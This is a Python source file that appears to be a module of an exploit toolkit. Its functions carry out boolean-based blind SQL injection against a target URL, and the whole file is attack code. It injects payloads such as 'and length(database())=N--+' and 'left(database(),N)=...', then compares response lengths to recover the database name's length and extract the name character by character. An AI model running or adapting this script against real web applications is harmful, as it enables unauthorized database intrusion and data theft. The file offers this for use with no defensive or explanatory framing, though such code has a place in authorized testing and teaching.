# -*- coding=utf8 -*-

import requests
import string

from common.outputHelp import print_error, print_success, print_info

s = requests.session()

def getDatabaseLength(baseurl):
    length = 0
    url = baseurl + "1"
    html = s.get(url).text
    print_info("[*] {0}".format(url))
    
    for i in range(1000):
        payload = "1 and length(database())={0}--+".format(str(i))
        print_info("[*] " + payload)
        url = baseurl + payload
        if len(html) == len(s.get(url).text):
            length = i
            break
    print_success("[+] length=> " + str(length) + '\n')
    return length

def getDatabase(baseurl, length):
    database = ''
    url = baseurl + "1"
    html = s.get(url).text

    
    for i in range(length):
        for value in string.printable:
            payload = "1 and left(database(),{0})='{1}'--+".format(str(i+1), database+value)
            url = baseurl + payload
            if len(html) == len(s.get(url).text):
                database += value
                print_info("[*] " + database)
                break
    print_success("[+] database=> " + database)

def exp(url):
    length = getDatabaseLength(url)
    getDatabase(url, length)
